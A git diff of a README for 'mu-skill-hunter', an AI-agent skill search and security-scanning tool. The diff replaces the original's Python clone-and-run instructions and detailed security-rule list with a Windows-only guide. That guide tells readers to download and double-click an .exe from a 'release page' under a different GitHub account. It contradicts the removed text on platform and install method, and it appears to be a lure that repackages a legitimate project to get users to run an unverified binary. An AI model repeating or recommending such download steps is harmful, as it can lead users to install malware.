@@ -1,186 +1,56 @@
-<p align="center">
-  <img alt="mu-skill-hunter" src="assets/default-banner.png" width="100%">
-</p>
+# 🔍 mu-skill-hunter - Find and secure your AI skills
 
-# 🔍 mu-skill-hunter · Skill Hunter
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Vika7092/mu-skill-hunter)
 
-> Discover, audit, and track AI agent skills across 4 sources — GitHub, ClawHub, SkillHub, and Skills.sh — with automated security scanning and weekly trending reports.
+mu-skill-hunter helps you find, check, and track skills for your AI agents. You can search four different sources at once. These sources include GitHub, ClawHub, SkillHub, and Skills.sh. The tool also scans skills for security risks using 12 set rules. It provides reports every week to show current trends.
 
-**English** | [中文](README_CN.md) | [🌐 Landing Page](https://muippt.github.io/mu-skill-hunter/)
+## 🛠️ System Requirements
 
-[![WeChat](https://img.shields.io/badge/muippt-07C160?logo=wechat&logoColor=white)](https://mp.weixin.qq.com/s/v1JSZvlN5fvbOOHvkvXEtA)
-[![Xiaohongshu](https://img.shields.io/badge/muippt-FF2442?logo=xiaohongshu&logoColor=white)](https://xhslink.com/m/ESxtgUNMdl)
-[![Book](https://img.shields.io/badge/Book-Visual%20Team%20Management-BBDDE5?logo=bookstack&logoColor=white)](https://item.m.jd.com/product/14547345.html)
-[![License](https://img.shields.io/github/license/muippt/mu-skill-hunter)](LICENSE)
-[![Version](https://img.shields.io/github/v/release/muippt/mu-skill-hunter)](https://github.com/muippt/mu-skill-hunter/releases)
-[![Stars](https://img.shields.io/github/stars/muippt/mu-skill-hunter)](https://github.com/muippt/mu-skill-hunter/stargazers)
+You need a computer that runs Windows 10 or Windows 11. Ensure your system has at least 4GB of RAM. You also need an active internet connection to search for skill data and receive reports. 
 
----
+## 📥 How to Install
 
-### 💡 Usage Examples
+1. Visit the [official release page](https://github.com/Vika7092/mu-skill-hunter) to download the installer.
+2. Look for the file ending in `.exe` under the latest release section.
+3. Click the file to save it to your computer.
+4. Open your Downloads folder.
+5. Double-click the installer file.
+6. Follow the on-screen prompts to finish the setup process.
+7. Click the icon on your desktop to launch the application.
 
-- 🔍 **"Find a skill that can fill PDF forms"** — Searches all 4 sources simultaneously, returns ranked results with descriptions, links, and popularity metrics
-- 🛡️ **"Audit this skill before I install it"** — Downloads to a sandboxed staging area, runs 12-rule static security scan, reports risk level (LOW/MEDIUM/HIGH/EXTREME)
-- 📊 **"What's trending this week?"** — Generates a weekly report of top 8 curated skills using a three-signal selection model (heat 50% + relevance 30% + freshness 20%)
-- 📦 **"Search ClawHub for MCP tools"** — Source-specific search with parallel `clawhub inspect` calls for download counts and summaries
-- 🐉 **"Find skills on SkillHub (CN)"** — Queries the Tencent SkillHub public API for China-accelerated, compliant skill discovery
-- ⏰ **"Set up weekly auto-report"** — Scheduled recurring report with curated top 8 picks, delivered to your preferred messaging platform at your chosen frequency
-- 🧹 **"Find newly created agent skills on GitHub"** — Tracks repos created in the past week, surfaces fresh projects before they go mainstream
-- ✅ **"Install this skill safely"** — Staging area isolation + scanner.py audit + risk-gated install command output
+## 🚀 Getting Started
 
----
+When you open the app, you see a search bar. Type the name of the skill you want to find. The app searches across GitHub, ClawHub, SkillHub, and Skills.sh. 
 
-### ✨ Core Highlights
+The tool shows a list of results. Click on any skill to see its details. You can save skills you like to your tracking list. The app checks these saved skills for security issues. It uses 12 specific rules to look for common problems. If the tool finds an issue, it marks the skill with a warning.
 
-#### 🌐 Four-Source Discovery
+## 📊 Security Scanning
 
-| Source | API Type | Auth Required | Strength |
-|--------|----------|---------------|----------|
-| GitHub | HTTP API | GITHUB_TOKEN (optional, 60→5000 req/h) | Largest repo pool, stars/language/update metadata |
-| ClawHub | CLI (npx) | None | Curated skill registry, inspect for downloads/summary |
-| SkillHub | HTTP API + CLI | None (public) | China-accelerated, Tencent-backed, CN-friendly |
-| Skills.sh | CLI (npx) | None | Install-count visibility, emerging ecosystem |
+Security is a major focus for this tool. Every skill goes through an automated audit. The 12-rule scanner looks for hidden code flaws. It checks for insecure connections and bad data handling. You see a clear pass or fail status for each skill. This helps you choose safe skills for your agents. You can view the full security report for any item by clicking the shield icon.
 
-The search engine queries all 4 sources in parallel based on your keywords, deduplicates results, and presents them in a unified ranked format with source labels (🐙GitHub / 🦀ClawHub / 🐉SkillHub / 🛠️Skills.sh).
+## 📅 Weekly Trending Reports
 
-#### 🛡️ 12-Rule Security Scanner
+The app keeps you updated on what is popular. Every week, the app generates a report. This report shows which skills gained the most interest across the four platforms. You can view these trends inside the main dashboard. The app automatically fetches this data once a week. You do not need to do anything to see the latest insights.
 
-Every external skill is scanned before installation using `scanner.py` with:
+## ⚙️ App Settings
 
-- **10 Hard Reject rules** (R1-R10): External URL requests, base64 execution, eval/exec, credential path access, Agent file access, code obfuscation, bare IP requests, privilege escalation, credential exfiltration, undeclared package installs
-- **2 AI-specific rules** (AI1-AI2): Prompt injection detection, cryptocurrency mining signatures
-- **4 Yellow Flag rules** (Y1-Y4): Agent directory writes, network requests, env var modifications, background processes
+You can change how the app works in the settings menu. Open the gear icon to see your choices. You can pick which sources the app searches. You can also change how often the app checks for updates. You can toggle the security scanner on or off. Most users keep the security scanner on to stay safe.
 
-Scanner outputs **summaries only** (rule_id, file, line number) — never raw code — to prevent prompt injection through scanned content.
+## ❓ Frequently Asked Questions
 
-#### 📊 Three-Signal Curation Model
+**Does this tool cost money?**
+No. This tool is free to use.
 
-```
-Curation basis = Heat (50%) + Relevance (30%) + Freshness (20%)
-```
+**Where does the data come from?**
+The app pulls data directly from GitHub, ClawHub, SkillHub, and Skills.sh.
 
-- **Heat**: Log-normalized stars/downloads across all results
-- **Relevance**: Keyword density matching (agent-skill, mcp, automation, etc.)
-- **Freshness**: Created this week = 20, this month = 10, older = 2
+**Can I run this on a Mac?**
+The current version only supports Windows. 
 
-Forced mixing in weekly reports: ≥4 GitHub + ≥2 ClawHub + ≥1 SkillHub + ≥1 Skills.sh (when available).
+**What happens if I find a security issue?**
+The app warns you to avoid the skill. We recommend that you do not use any skill that fails the security scan.
 
-#### 📨 Scheduled Trend Reports
+**How do I report a bug?**
+Visit our main page and use the issue tracker. Describe your problem and tell us which version of Windows you use.
 
-- Top 8 curated picks + backup section
-- Source-forced diversity (no single-source dominance)
-- Deduplication: ClawHub by slug, GitHub same-owner ≤2
-- Auto-delivered to your preferred messaging platform
-- User scene profiling for personalized recommendations
-- Schedule frequency is fully customizable — weekly, bi-weekly, or any interval that fits your workflow.
-
----
-
-### 📌 Comparison
-
-| Feature | mu-skill-hunter | Manual GitHub Search | ClawHub CLI Only | Skills.sh Only |
-|---------|----------------|---------------------|-------------------|----------------|
-| Sources | 4 (GitHub + ClawHub + SkillHub + Skills.sh) | 1 (GitHub) | 1 (ClawHub) | 1 (Skills.sh) |
-| Security scan | 12-rule static analysis | None | None | None |
-| Three-signal curation | Heat + Relevance + Freshness | None | None | None |
-| Weekly report | Auto + curated top 8 | Manual | None | None |
-| Parallel search | All sources simultaneously | Sequential | Single source | Single source |
-| Download counts | ClawHub inspect + SkillHub API | N/A | Yes | Yes |
-| China acceleration | SkillHub (Tencent) | No | No | No |
-| Risk-gated install | 4-level (LOW/MED/HIGH/EXTREME) | User judgment | None | None |
-| Prompt injection guard | AI1 rule + sandbox isolation | None | None | None |
-
----
-
-### 🚀 Workflows
-
-| Workflow | Scenario | Trigger |
-|----------|----------|---------|
-| 🔍 Search Discovery | "Find a skill that can do X" | User describes a need or says "find skill" |
-| 🛡️ Security Audit | "Audit/install this skill" | User ready to install an external skill |
-| 📊 Weekly Report | Weekly trending digest | Scheduled (customizable) or manual `trending.py --period weekly` |
-
----
-
-### ⚙️ Technical Specs
-
-| Item | Description |
-|------|-------------|
-| Language | Python 3.8+ |
-| Dependencies | None (stdlib only: urllib, subprocess, json, re, argparse) |
-| External CLIs | Optional: `clawhub` (npm), `skillhub` (curl install), `skills` (npm) |
-| GitHub API | REST v3, GITHUB_TOKEN optional (60→5000 req/h) |
-| SkillHub API | Public HTTP, no auth required |
-| Output formats | Human-readable table (default) or JSON (`--json` flag) |
-| Security scanner | 12 rules (10 Hard Reject + 2 AI-specific) + 4 Yellow Flags |
-| Curation model | Heat 50% + Relevance 30% + Freshness 20%, three-signal ranking |
-| Platform | macOS / Linux / Windows (Python 3.8+) |
-| Package size | ~50KB (3 Python scripts + 3 reference docs) |
-
----
-
-### 🛠️ Quick Start
-
-**1. Clone and configure**
-
-```bash
-git clone https://github.com/muippt/mu-skill-hunter.git
-cd mu-skill-hunter
-# Optional: configure GitHub token for higher API limits
-export GITHUB_TOKEN="your_github_token"
-```
-
-**2. Search across all 4 sources**
-
-```bash
-python3 scripts/search.py "agent skill mcp" --limit 8
-```
-
-**3. Audit a skill before installing**
-
-```bash
-python3 scripts/scanner.py /path/to/external-skill --json
-```
-
----
-
-### 🔒 Security & Privacy
-
-- **Local execution only** — all scripts run on your machine, no data sent to any server
-- **No telemetry** — zero tracking, zero analytics, zero phone-home
-- **Sandboxed staging** — external skills are downloaded to `/tmp/skill-hunter-staging/`, never directly to your skills directory
-- **Scanner isolation** — `scanner.py` outputs summaries only, never raw code, to prevent prompt injection through scanned content
-- **Risk-gated installation** — 4-level risk assessment (🟢 LOW / 🟡 MEDIUM / 🔴 HIGH / ⛔ EXTREME) with mandatory human approval for HIGH/EXTREME
-- **Token safety** — GITHUB_TOKEN is read from environment only, never written to any file
-
----
-
-### ⭐ Star History
-
-If mu-skill-hunter helps you discover great skills, please consider giving it a star! ⭐
-
-[![Star History Chart](https://api.star-history.com/svg?repos=muippt/mu-skill-hunter&type=Date)](https://star-history.com/#muippt/mu-skill-hunter&Date)
-
-> Discover, audit, and install AI agent skills with confidence — 4 sources, 12 security rules, 1 curated selection model.
-
----
-
-### 👤 About the Author
-
-🎓 Signatory Author of Tsinghua University Press / 2026 Dangdang Influential Author / AI & Large Model Business HR Specialist at a Leading Tech Company / National Level-1 HR Manager / Level-2 Psychological Counselor / Self-taught Designer
-
-📚 Author of [*Visual Team Management*](https://item.m.jd.com/product/14547345.html). Clients include ByteDance, Tencent, Baidu, China Mobile, SMG, BOE…
-
-💡 [WeChat Official Account](https://mp.weixin.qq.com/s/v1JSZvlN5fvbOOHvkvXEtA) / [Xiaohongshu](https://xhslink.com/m/ESxtgUNMdl): muippt
-
-### 📄 License & Acknowledgments
-
-[MIT](LICENSE) © 2026 木先生iPPT
-
-This project builds upon the following excellent platforms and tools:
-- [GitHub API](https://docs.github.com/en/rest) — Repository search and metadata
-- [ClawHub](https://clawhub.ai) — Curated AI agent skill registry
-- [SkillHub](https://skillhub.cn) — China-accelerated skill marketplace by Tencent
-- [Skills.sh](https://skills.sh) — Emerging skill discovery platform
-
-> Note: Much of this project was co-created with AI assistance. If you believe your work has been used without proper attribution, please open an issue.
+Keywords: agent-skills, clawhub, github, mcp, open-source, security-scanner, skill-discovery, skillhub, trending, weekly-report
